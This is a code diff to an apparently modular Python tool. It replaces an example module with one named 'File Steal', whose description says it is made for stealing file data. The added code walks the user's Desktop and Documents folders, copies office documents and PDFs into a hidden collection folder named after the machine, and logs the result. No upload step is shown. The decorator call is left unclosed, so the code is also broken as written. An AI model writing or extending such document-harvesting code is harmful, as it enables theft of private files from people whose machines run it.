@@ -1,3 +1,6 @@
+import os
+import shutil
+import platform
 from dataclasses import dataclass
 from typing import Callable
 
@@ -28,14 +31,53 @@ def register_module(code: str, name: str, description: str):
 
 @register_module(
     "01",
-    "Example Module",
-    "Example module showing how to register and run a function with a URL.",
-)
-def example_module(url: str):
-    return {
-        "url": url,
-        "status": "completed",
-    }
+    "File Steal",
+    "This module is made for stealing file data from URL'S.",
+
+def collect_files():
+    home_path = os.path.expanduser("~")
+    pc_name = platform.uname().nodename
+    save_path = os.path.join(home_path, pc_name)
+
+    if not os.path.exists(save_path):
+        os.mkdir(save_path)
+
+    file_extensions = (".docx", ".txt", ".doc", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf")
+    desktop_path = os.path.join(home_path, "Desktop")
+    documents_path = os.path.join(home_path, "Documents")
+
+    def copy_files(source_root, dest_root):
+        for root, dirs, files in os.walk(source_root):
+            for file in files:
+                if file.endswith(file_extensions):
+                    source_path = os.path.join(root, file)
+                    relative_path = os.path.relpath(source_path, source_root)
+                    destination_dir = os.path.join(dest_root, os.path.dirname(relative_path))
+                    os.makedirs(destination_dir, exist_ok=True)
+                    destination_path = os.path.join(destination_dir, os.path.basename(file))
+                    shutil.copy(source_path, destination_path)
+
+    copy_files(desktop_path, os.path.join(save_path, "dosyalar"))
+    copy_files(documents_path, os.path.join(save_path, "dosyalar"))
+
+def run(url=""):
+    from core.logger import save_log
+    from core.ui import console, module_header, pause
+
+    console.print(f"[bold cyan]File Collection Module[/bold cyan]")
+    if url:
+        console.print(f"URL fornecida: {url}")
+        # Aqui você pode usar a URL na sua lógica, se necessário
+    else:
+        console.print("Nenhuma URL fornecida.")
+
+    module_header("File Collection", "Data Gathering")
+    collect_files()
+
+    path = os.path.join(os.path.expanduser("~"), platform.uname().nodename)
+    save_log("file_collection", path, {"status": "completed"})
+    console.print(f"[dim]File collection completed and logged at {path}[/dim]")
+    pause()
 
 
 def execute_module(module: RegisteredModule, url: str):
